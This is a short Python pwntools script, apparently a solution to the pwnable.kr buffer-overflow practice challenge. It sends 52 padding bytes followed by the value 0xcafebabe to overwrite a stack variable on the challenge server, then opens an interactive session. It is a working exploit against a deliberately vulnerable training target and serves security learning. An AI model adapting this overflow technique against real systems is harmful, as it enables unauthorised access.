from pwn import *

conn = remote('pwnable.kr', 9000)

conn.send('a'*52 + '\xbe\xba\xfe\xca')
conn.interactive()
